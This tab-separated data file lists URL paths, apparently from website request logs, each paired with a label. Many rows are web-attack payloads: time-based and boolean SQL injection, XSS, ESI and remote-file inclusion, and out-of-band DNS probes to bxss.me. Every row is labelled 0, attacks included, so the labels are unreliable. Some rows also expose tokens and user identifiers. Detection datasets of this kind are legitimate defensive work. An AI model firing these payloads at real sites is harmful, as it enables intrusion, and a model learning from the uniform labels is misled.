sentences	labels
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u6768\u548c\u9547\u9e3f\u8fbe\u670d\u88c5\u5e03\u827a\u5546\u884c 	 0
/**********/system/2021/09/06/013446513.shtml 	 0
/*********/treasury/index.aspx?nodeid=394 	 0
/**********/system/2021/05/13/013384323.shtml 	 0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u5927\u6218\u573a\u4e61\u5587\u5fd7\u519b\u7cae\u98df\u8d2d\u9500\u7ecf\u7eaa\u4eba 	 0
/****/zxta/202112/t20211208_3210216.html 	 0
/******/system/2017/10/13/012439388.shtml 	 0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u4e2a\u4f53\u7ecf\u8425\u9f0e\u946b\u6c7d\u8f66\u88c5\u6f62\u90e8 	 0
/*******/zwgk/czgk/bmyjs/zzqjcyxt/zwsrmjcy/ 	 0
outurl/*******/gvideos.php?gid=1 and 1=2 	 0
/*******/qiye/b-e929818.html 	 0
zzsl/******/http://bxss.me/t/fit.txt/t20210723_2938511.html 	 0
was5/***/search/search?page=3&channelid=287219&searchword=1&keyword=1&orderby=-docreltime');select sleep(5) 	 0
xwdt/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/********/gzdt.htm 	 0
was5/***/search/search?page=3&channelid=287219&searchword=1) and 6601=(select 6601 from pg_sleep(5)) and (8832=8832&keyword=1&orderby=-docreltime&perpage=7&outlinepage=10 	 0
xxgk/*****/1079/1081/list.html?new='""()&%<acx><script >y8cz(9991)</script> 	 0
/**********/system/2017/04/18/012289619.shtml 	 0
/***/0/00/60/61/606128_108775.jpg 	 0
/****/crf/ldhd 	 0
hdjl/****/"".gethostbyname(lc(""hiteh"".""qsljeylbca325.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(121).chr(89).chr(108).chr(75).""/t20210303_2614145.html 	 0
/****/web/search?channelid=222832&searchword=\u5f6d\u9633\u53bf\u674e\u6709\u624d\u6cb9\u574a 	 0
/*******/qiye/b-e1383729.html 	 0
/****/sj1/tjxx/index_6.html 	 0
/zwxx_11337/****/202102/t20210201_2587879.html 	 0
/****/202111/w020211112399856738886.jpg 	 0
xwzx'||'/****/ 	 0
/zwxx_11337/*******/202111/w020211105340080850160.jpg 	 0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u5b89\u6cf0\u534e\u4e94\u91d1\u673a\u7535\u7ecf\u9500\u90e8 	 0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u71d5\u5b50\u670d\u88c5\u5e97 	 0
service/**/setpassguardctrl?id=1' and 1=dbms_pipe.receive_message(7d,15) and '1'='1 	 0
es/****/job/lib/ap_resume_workcity.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects) 	 0
/***/interface/comul_total.json.jsp?callback=jquery191017961078742310832_1639990851234 	 0
/***/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u9655\u897f 	 0
module/***/jpage/bxss.me/default/css/jpage.css 	 0
/**********/cba/morecba/2020-04-29/91556.html 	 0
xxgk/******//xfs.bxss.me/zfxxgkml_2127/jgzn_2042/list.html 	 0
swwj/******/2021/11/23/javascript:window.close(); 	 0
/****/zt/nlkfxjjsyq/syqdt/202004/t20200421_2040893.html 	 0
ztsj/**/yjssyd/\"javascript:void(0)\" 	 0
/*******/qiye/b-e2276060.html 	 0
qhly/******/2017/03/09/javascript:window.print() 	 0
ywly/****/jcgc' and 2*3*8=6*8 and 'h85h'='h85h/ 	 0
/****/web/search?channelid=222832&searchword=\u897f\u5317\u8f74\u627f\u5382\u8fd0\u8f93\u516c\u53f8\u6d66\u6c85\u96c6\u56e2\u5b81\u590f\u7279\u7ea6\u7ef4\u4fee\u7ad9 	 0
/******/visitcount/visit.jsp?type=3&i_webid=1&i_columnid=33&i_articleid=22023 	 0
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u7a33\u7ecf\u6d4e 	 0
_vsl/********************************/0caf9db1/18db1/ 	 0
ywly/0""xor(if(now()=sysdate(),sleep(15),0))xor""z/****/ 	 0
/**********/system/2017/08/11/012381534.shtml 	 0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u91d1\u7115\u5546\u884c 	 0
ywly/*****/index.html?continent=%' and 1337=7450  	 0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u8299\u84c9\u6d17\u5316\u7cbe\u54c1\u5e97 	 0
/****/gjdjbn/djbn_jthd/index_1.html 	 0
was5/***/search?channelid=254846&searchword=北京' && benchmark(2999999,md5(now())) order by 20  	 0
/****/20211123/10777.html 	 0
ldzc/****/202007/t20200701_168744.html?leader=bxss.me 	 0
/*******/842892.html 	 0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u94f6\u6d77\u623f\u5730\u4ea7\u5f00\u53d1\u6709\u9650\u516c\u53f8 	 0
system/********/code/datainput.jsp?owner=') or 6889=6889  	 0
/***/layui/lay/modules/jquery.js?v=1639972890946 	 0
vc/**/lib/bxss.me/themes/bootstrap/messager.css 	 0
zxgg/********/javascript:void(0); 	 0
xwzx/****/myspace/student.php?keyword=31337"" onmouseover=confirm(777)//&active=0&_qf__search_user=&submit=search 	 0
synr/******/formwlansetup?apmode=0&band=2&ssid=&chan=11&macaddrvalue=&wlanmacclone=0&wlanmac=&automacclone=no&repeaterssid=&wllinkmac1=&wllinkmac2=&wllinkmac3=&wllinkmac4=&wllinkmac5=&wllinkmac6=&x=54&y=12&wlan-url=test>alert(777)test 	 0
/zwxx_11337/****/202105/t20210520_2848290.html 	 0
/****/zzxxgk/jjhzj/sqgk/tzfw/202005/w020200519643037016902.jpg 	 0
/****/web/search?channelid=222832&searchword=\u7075\u6b66\u5e02\u55b5\u55b5\u5c0f\u5c4b 	 0
/*****/gy48/cpgyss.asp?key=\u58f3\u724c\u771f\u7a7a\u6cf5\u6cb9&order=1 	 0
qtyz/**********/api.php?callback=jquery211027821724654516156_1466662510279}}1c027<script>alert(777)</script>cf2ea&type=get&mode=0&_=1466662510280 	 0
/*****/system/2013/04/03/011054459_13.shtml 	 0
/****/system/2017/03/19/012267319.shtml 	 0
/****/system/2020/10/12/012073960.shtml 	 0
/****/qzfwj/202110/t20211012_3080212.html 	 0
jsearchfront/********/http://bxss.me/t/fit.txt?.jpg/110105008056111/16/images/jquery.waterfall.js 	 0
/******/system/2017/05/25/012319359.shtml 	 0
/**********/system/2020/04/29/013151891.shtml 	 0
/****/gfxwj/201910/">\u81ea\u6cbb\u533a\u653f\u5e9c\u9a7b\u4e0a\u6d77\u529e\u4e8b\u5904</a> 	 0
/***/viewspace-541.html 	 0
/**********/system/2020/05/06/013155489.shtml 	 0
/*****/index/lists/cate_id/157.html 	 0
/zwxx_11337/****/ytdd/202004/t20200420_2038626.html 	 0
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u8425\u5546\u73af\u5883 	 0
xwzx/0'xor(if(now()=sysdate(),sleep(15),0))xor'z/2021_mtgz/******/t20210712_310551.html 	 0
jinronglicai/*******/if(now()=sysdate(),sleep(12),0)/2017-01-24/193.html 	 0
/*****/search.asp?field=my_baizi&classid=&keyword=\ufffd\ufffd\ufffd\u017b\ufffd 	 0
/******/2016lh/zb/zx/ 	 0
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u4f01\u4e1a\u521b\u65b0 	 0
/*******/201906201414233337 	 0
js/******/common/signin.aspx?cbautosignin=""alert(777) 	 0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u94a2\u8a89\u7269\u8d44\u6709\u9650\u516c\u53f8 	 0
/****/czgk/bmyjs/zzqfyxt/ldxrmfy/201802/t20180223_692973.html 	 0
/****/web/search?channelid=222832&searchword=\u7075\u6b66\u5e02\u518d\u6765\u7f8e\u6d17\u6da4\u5316\u5986\u54c1\u5e97 	 0
/*******/qiye/e141648232.html 	 0
/****/202106/t20210608_2877388.html 	 0
/*********/articlelist_4g4.do?columnarticlelistdeal_4g4_channelid_ss=channelid&columnarticlelistdeal_4g4_contenttype_ss=channelid&channelid=shichang¤tpage=1 	 0
/*******/201903/201903291342011098.html 	 0
/****************/notification?access_token=63ea6d50-9c67-4f0e-a06d-ce1c6f3e02de&id=undefined 	 0
/**********/system/2021/06/03/013395832.shtml 	 0
/***/interface/daily_clickcount.json.jsp?callback=jquery19105462992814656475_1639991083525 	 0
lz//**/zzpw2jeu/xhr_send?t=1629434847655 	 0
vc/**/lib/jquery/http://bxss.me/t/fit.txt.js 	 0
was5/***/search?page=2&channelid=253477&searchword=1&keyword=1&orderby=-docreltime%' or 9507=9507 /*&perpage=15&outlinepage=10 	 0
/****/bmkx/sgaj/202007/w020200702359556513772.jpg 	 0
/****/web/search?channelid=222832&searchword=\u897f\u5409\u53bf\u658c\u6d77\u7164\u70ad\u9500\u552e\u70b9 	 0
/***/interface/url_total_pv.json.jsp?callback=jquery19107918219243654412_1639973054017 	 0
/****/web/search?channelid=222832&searchword=\u6d77\u539f\u53bf\u6d77\u57ce\u9547\u674e\u6625\u6d77\u94dd\u5408\u91d1\u95e8\u7a97\u52a0\u5de5\u5e97 	 0
css/*********/plugins/handwrite/index.php?id="">alert(777) 	 0
/****/web/search?channelid=222832&searchword=\u5f6d\u9633\u53bf\u5170\u5dde\u6e90\u76db\u725b\u8089\u62c9\u9762\u9986 	 0
/****/byyw/202101/t20210125_176759.html 	 0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u84dd\u585e\u7eb3\u6cb3\u7554\u79c1\u53a8\u6c34\u997a\u5e97 	 0
/****/web/search?channelid=222832&searchword=\u897f\u5409\u53bf\u51b0\u4e4b\u7269\u8bed\u70e4\u5427 	 0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u4e2a\u4f53\u7ecf\u8425\u987a\u901a\u8fbe\u7535\u710a\u90e8 	 0
was5/***/search?channelid=234439&orderby=relevance&perpage=24&searchword=1 if(now()=sysdate(),sleep(0),0)/*'xor(if(now()=sysdate(),sleep(0),0))or'""xor(if(now()=sysdate(),sleep(0),0))or""*/ 	 0
/zwxx_11337/****/201904/w020190408313218548590.jpg 	 0
2016zt/******/2016/03/02/javascript:void(0); 	 0
/****/zdgz/2019_zdgz/201910/t20191011_224092.html 	 0
/***********/zaojianpinglun/?_=1640036080319 	 0
module/*****/ckplayer/ckplayer.js/"><script>alert(452)</script>?_=1630311410238 	 0
/zwxx_11337/****/202005/t20200528_2103828.html/index_1.html 	 0
nxcount/********/<% contenteditable onresize=nyj4(9756)> 	 0
gygj/****/gjjj/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 0
swld/******/2021/11/05/javascript:window.close(); 	 0
system/********/js'||'/ajax.js 	 0
/****/system/2017/03/29/012275237.shtml 	 0
/******/usercenter/index?qrcode=1689&code=041ot2ll23pck84dfkol2kvd4n3ot2lr 	 0
zwgk/******/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/zws/hyx/xmb_gzdxb.htm 	 0
/***/blockdata/getsearchinfo.do?&title=\u4e0a\u5f62 	 0
zmhd/*****/'""()&%<acx><script >pimo(9643)</script>/zmhdyc.html 	 0
/****/whhd/202012/w020201224831500271436.jpg 	 0
/****/system/2018/02/13/012549358.shtml 	 0
module/**********/visit.jsp/"><script>alert(5829)</script>?type=2&i_webid=1&i_columnid=5377 	 0
swwj/******/2021/09/08/javascript:void(0); 	 0
/zwxx_11337/****/201912/t20191226_1905171.html 	 0
/***/interface/url_total_pv.json.jsp?callback=jquery19107149650742381015_1639980317498 	 0
/**********/system/2020/07/02/013197390.shtml 	 0
tencent:/*******/tencent:/*******/tencent:/*******/tencent:/*******/?uin=1969854010' and 1=1 and 'a'='a&site=&menu=yes 	 0
/****/20200822/e105313679.html 	 0
/****/bysw/swsj/ 	 0
/*******/qiye/b-e2280359.html 	 0
zfld/******/2021/09/07'""/><style>@import""javascript:alert(1465)"";</style>/013446963.shtml 	 0
/**/system/2007/10/11/002226591.shtml 	 0
skin/**/lib/0'xor(if(now()=sysdate(),sleep(15),0))xor'z.js 	 0
/***/150/00/63/90/639050_977775.jpg 	 0
/****/czgk/bmjs/qtdw/zzqhtglzx/201808/t20180816_977700.html 	 0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u9646\u8fd0\u8d27\u8fd0\u90e8 	 0
was5/***/search?channelid=299868&perpage=1000%' or 8641=2415 and '%'=' 	 0
index/******/2010/04/23/010104831_04.shtml 	 0
/****/lkw/yw_1292/201707/w020170728505525998319.jpg 	 0
/*******/qiye/20211125/e142413117.html 	 0
/****/qzfwj/201909/t20190904_1720536.html 	 0
/****/web/search?channelid=222832&searchword=\u8d3a\u5170\u53bf\u7f8e\u6d01\u5df7\u59ae\u6d77\u5c14\u8bd7\u7f8e\u5bb9\u7f8e\u4f53\u5e97 	 0
lz/********/loggedout.jsp?locale=""><script>alert(777)</script> 	 0
joomla/**********/com_jnews/includes/openflashchart/open-flash-chart.swf?get-data=(function(){alert(document.domain)})() 	 0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u68ee\u9e3f\u6770\u5de5\u7a0b\u52b3\u52a1\u6709\u9650\u516c\u53f8 	 0
news/********/guowaishichangzhunru?page=1 and 7499=9449# 	 0
ldzc' and 2*3*8=6*8 and 'n877'='n877/****/swsj/ 	 0
was5/***/search?channelid=253477&keyword=the%' and 2*3*8=6*8 and '8b2o'!='8b2o%&orderby=-docreltime&outlinepage=10&page=3&perpage=15&searchword=the 	 0
socket.gethostbyname(""hitmo"" ""dwzjkfoa0e1a9.bxss.me."")[3].to_s) ""/********/jcse/110105008056111/16/images/plugin/voice/hzrecorder.js 	 0
/****/partsprocessinfor/validatecheckingqty.do 	 0
/*****/index/goods/cate_id/179.html?page=2 	 0
ztpd/*********/wnzyq/javascript:void(0); 	 0
/****/jtdt/2021_jtyw/202108/t20210806_313968.html 	 0
/******/system/2021/12/13/013493719.shtml 	 0
/****/zhengce/zfwjn/202009/p020211202412440348702.pdf 	 0
/****/bmkx/sfgw/202011/w020201112392452387277.png 	 0
/****/xqdt/hnx/202103/local.replace( 	 0
/*****/gy48/cpgyss.asp?key=\ufffd\ufffd\u0435\ufffd\ufffd\ufffd\ufffd\ufffd\u8c78&l=\ufffd\ufffd\ufffd\ufffd 	 0
system/********/storage/localupload.jsp?doaction=save and 7219=7219--&rid=1rnott09fg&uptoken=1ff87566684b40c688f756b86e2c3798 	 0
/******/system/2019/06/21/012909231.shtml 	 0
news/********/gaocengdongtai?page='""()&%<acx><script >fbh7(9369)</script> 	 0
/zwxx_11337/****/201912/t20191206_1874699.html 	 0
/****/20190201/6203.html 	 0
2016zt/******/2020/09/13/javascript:void(0); 	 0
/**************/newscenter/system/2021/12/20/013496902.shtml 	 0
/****/bmkx/sgaj/201801/t20180112_98990.html 	 0
/***/interface/comul_total.json.jsp?callback=jquery19105992449480681414_1639980186108 	 0
jsearchfront/********/jcse/110105008056111/16/images/plugin'||'/websitechange/zwdt_v3.css 	 0
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u5185\u8d38 	 0
/****/web/search?channelid=222832&searchword=\u7ea2\u5bfa\u5821\u533a\u6d77\u9e4f\u6279\u53d1\u90e8 	 0
vc/**/lib"" and 2*3*8=6*8 and ""kljl""=""kljl/easyui/plugins/jquery.messager.js 	 0
was5/***/search/search?page=3&channelid=287219&searchword=1&keyword=1&orderby=-docreltime';select pg_sleep(5)--&perpage=7&outlinepage=10 	 0
/******/jl_indexbigpic_li3.png 	 0
xq/******/2020/11/03/javascript:void(0); 	 0
/***/0/00/70/17/701793_453863.jpg 	 0
/****/1216/559621.shtml 	 0
lcgg/********/javascript:void(0); 	 0
/*******/qiye/b-e1781306.html 	 0
/****/20200624/e102724400.html 	 0
jsearchfront/********/jcse/110105008056111/16'""()&%<acx><script >srzj(9066)</script>/images/searchbtn.js 	 0
/**********/system/2021/12/17/013495992.shtml 	 0
/**********/system/2021/04/01/013360527.shtml 	 0
/***/2021/8/18/art_37_237469.html 	 0
zfld/******/2021/09/07/013446963'""/><img src=javascript:alert(1534)>.shtml 	 0
/****/20201123/e110499500.html 	 0
zfld/******/2021/09/07/013446963'"/>< 	 0
/***/interface/url_total_pv.json.jsp?callback=jquery19109677395102880397_1639991078515 	 0
xwdt/********/""><script>alert`34605`</script> 	 0
/****/xxgkml/qtfdxx/zcjd/list.html 	 0
shzr/**********/index.php?rt="><script>alert(777);</script>&s=your_admin"><script>alert(777);</script>&token=957bf7cb71078f4471807da1c42d721e"><script>alert(777);</script> 	 0
/**********/system/2020/05/21/013166979.shtml 	 0
ywly/*****/index.html?continent=%' and 1053=1796  	 0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u76d6\u6e7e\u6751\u946b\u79c0\u5546\u5e97 	 0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u6d69\u94a7\u94dd\u5408\u91d1\u52a0\u5de5\u90e8 	 0
/****/zdgz/2019_zdgz/ 	 0
/****/byszf/202112/w020211203525851814537.jpg 	 0
zwgk'||'/****/leader/mhw.htm 	 0
hdjl/'.gethostbyname(lc('hitik'.'eilamvwwa8307.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(104).chr(89).chr(113).chr(84).'/******/t20201225_2539623.html 	 0
/****/zt/msss/msxw/202004/t20200417_2037847.html 	 0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u4e2a\u4f53\u7ecf\u8425\u5c1a\u8d35\u7535\u710a\u90e8 	 0
/***/0/02/03/96/2039642_784585.jpg 	 0
/****/202104/t20210428_2802809.html 	 0
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u8389\u747e\u7f8e\u5bb9\u4f1a\u6240 	 0
/***/interface/daily_clickcount.json.jsp?callback=jquery17108374859517588351_1639980404478 	 0
/*****/gy48/cpgyss.asp?key=\u6df1\u5733\u5e02\u5fd7\u7f8e\u667a\u80fd\u79d1\u6280\u6709\u9650\u516c\u53f8&l=\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd 	 0
/***********/zaojianpinglun/?_=1640035105489 	 0
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u9753\u4e3d\u7f8e\u5bb9\u7f8e\u53d1\u7528\u54c1\u7ecf\u9500\u5e97 	 0
ztpd/************/rmbd/javascript:void(0); 	 0
/zwxx_11337/****/201909/t20190909_1727362.html 	 0
/****/zzxxgk/wsjkwyh/gzdt_3599/xxdt/202112/t20211201_197158.html 	 0
/**********/system/2020/04/27/013150234.shtml 	 0
/*********/articlelist_4g4.do?columnarticlelistdeal_4g4_channelid_ss=channelid&columnarticlelistdeal_4g4_contenttype_ss=channelid&channelid=xinwen¤tpage=1 	 0
qhly/******/2016/04/15/javascript:dozoom(9) 	 0
/****/czgk/bmyjs/zzqjcyxt/sqcdqrmjcy/201903/t20190305_1297812.html 	 0
module/*****/ckplayer/ckplayer.js/<img src="javascript:alert(490)">?_=1630311430045 	 0
/***/0/01/47/39/1473979_962261.jpg 	 0
/zwxx_11337/****/201803/t20180305_698259.html 	 0
xxgk/******/2010/list.html?new=0.4586328373203723<esi:include src=""http://bxss.me/rpb.png""/> 	 0
jsearchfront/********/jcse/http://bxss.me/t/fit.txt?.jpg/16/images/jquery.waterfall.js 	 0
n42684/*******/n239053/index'||'.html 	 0
/***/col33/index.html?uid=19791&pagenum=3 	 0
/****/2020jnxc/\u751f(sheng)\u6001(tai)\u73af\u5883(jing)\u90e8\u5e94\u6025(ji)\u4e2d(zhong)\u5fc3(xin)\u8d1f(fu)\u8d23(ze)\u4eba(ren)\u5c31(jiu)\u300a\u7a81(tu)\u53d1(fa)\u751f(sheng)\u6001(tai)\u73af\u5883(jing)\u4e8b(shi)\u4ef6(jian)\u5e94\u6025(ji)\u5904(chu)\u7f6e(zhi)\u9636(jie)\u6bb5(duan)\u76f4(zhi)\u63a5(jie)\u7ecf(jing)\u6d4e(ji)\u635f(sun)\u5931(shi)\u6838(he)\u5b9a(ding)\u7ec6(xi)\u5219(ze)\u300b\u6709(you)\u5173\u95ee(wen)\u9898(ti)\u7b54(da)\u8bb0(ji)\u8005(zhe)\u95ee(wen) 	 0
/****/zzxxgk/jjhzj/zsxm/tdwl/202101/t20210108_175981.html 	 0
/****/fkxxfy/202109/t20210917_186701.html 	 0
index/*****/goods' and 2*3*8=6*8 and 'hzao'='hzao.html 	 0
/****/bmkx/sgsj/202111/w020211112622747254152.jpg 	 0
2021zt/******/2021/06/09/013399706'"/><script>alert(2294)</script>.shtml 	 0
/*****/003/004/500/00300450043_vw00000000000001_1049d570.mp4 	 0
/****/201909/t20190926_1757836.html 	 0
/****/20210205/e115819323.html 	 0
investors-garden/**********/graphic/2020-02-if(now()=sysdate(),sleep(12),0)/8981.html 	 0
0""xor(if(now()=sysdate(),sleep(12),0))xor""z/****/zjdt/gzdt/144.htm 	 0
system/********/code/datainput.jsp?owner=%' or 8745=8745 and '%%'='% 	 0
/**********/system/2020/10/09/013260329.shtml 	 0
/****/xqdt/jtx/201709/t20170929_95621.html 	 0
/**********/system/2021/04/01/013361139.shtml 	 0
/****/web/search?channelid=222832&searchword=\u540c\u5fc3\u53bf\u9999\u5f71\u670d\u9970\u4e13\u5356\u5e97 	 0
z/161208-http://*******/t/xss.html? 	 0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u53bf\u9547\u7f57\u4f9b\u9500\u5408\u4f5c\u793e\u89c2\u97f3\u5206\u9500\u5e97 	 0
module/********/downfile.jsp?classid=0') and 6832=4055 and ('wjpk'='wjpk&filename=7b396d3a62ad4679b73346f1765342f3.xls 	 0
/****/web/search?channelid=222832&searchword=\u540c\u5fc3\u53bf\u5174\u5170\u670d\u9970\u5e97 	 0
/****/czgk/bmyjs/zzqdwzfbmgljgsydw/zzqxxhjsb/ 	 0
/****/xqdt/hnx/201906/t20190605_124409.html 	 0
/****/web/search?channelid=222832&searchword=\u77f3\u5634\u5c71\u5e02\u661f\u6d77\u6e56\u5bbe\u9986\u6709\u9650\u8d23\u4efb\u516c\u53f8 	 0
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtimyi/zc4vm crnfxnt5npi=&openid=ovl7jjqaedf_bpi35kargfl1n6v0&outer_str=70831&activate_ticket=fdzv9emqaffrnr3xboqhb2bcx2daze1fvck2auvf5k3oo8dbj5 fzedtzplsmcaris3hq0csxvvk6sl kk23yluixnjn55/iaeksfcha1wk= 	 0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u8700\u5148\u751f\u6c49\u7cfb\u8001\u706b\u9505\u65b0\u534e\u4e1c\u8857\u5e97 	 0
/****/20210817/n.src 	 0
/****/bot/index.shtml 	 0
/about-southwest/******/2017-02-16/478.html 	 0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u98d8\u6b65\u8fd0\u52a8\u978b\u5e97 	 0
was5/***/search?channelid=299868*/-->'""></iframe></script></style></title></textarea><script >alert(96531)</script>&perpage=1000 	 0
/****/web/search?channelid=222832&searchword=\u6d77\u539f\u53bf\u8d3e\u5858\u4e61\u5f66\u4ec1\u725b\u7f8a\u517b\u6b96\u573a 	 0
index/******/2021/01/21/013323672'""/><img src=javascript:alert(1152)>.shtml 	 0
/*****/ywly/gygj/ssgs/kjcx/kjzl/xxgk/qtgkxx/ 	 0
/*******/qiye/b-e2230420.html 	 0
fxgg/********/javascript:void(0); 	 0
/****/20210305/e117594176.html 	 0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u8fdc\u8fdb\u6728\u6750\u7ecf\u9500\u90e8 	 0
xwzx/****/2021_mtgz/202103/t20210314' and 2*3*8=6*8 and 'xbop'='xbop_271326.html 	 0
/**********/system/2018/03/12/012563081.shtml 	 0
/***/minip/yimiao/ylmy-sel.png 	 0
/zwxx_11337/****/201901/t20190127_1266854.html 	 0
/****/xxgkml/zfwjn/201801/t20180116_99221.html 	 0
/***/0/01/90/94/1909462_402596.jpg 	 0
/****/czgk/bmyjs/zzqjcyxt/zzqgjzzqtljcy/201702/t20170207_318418.html 	 0
col'||'/*****/index.html 	 0
qhly/******/2013/07/23/javascript:dozoom(9) 	 0
kjcx/****/znzgjdqzdhzbyjs/' and 'x'='y 	 0
/******/system/2021/03/07/013346585.shtml 	 0
2021zt/******/2021/04/13/javascript:void(); 	 0
/*******/qiye/b-e2377925.html 	 0
/****/web/search?channelid=222832&searchword=\u76d0\u6c60\u53bf\u5415\u5f66\u6625\u4e94\u91d1\u65e5\u6742\u90e8 	 0
con/****/search.php?query=""onmouseover=""alert(1); 	 0
/***/0/01/99/60/1996063_267948.jpg 	 0
ztpd/******/count/0036001/015000000000/window.location.href 	 0
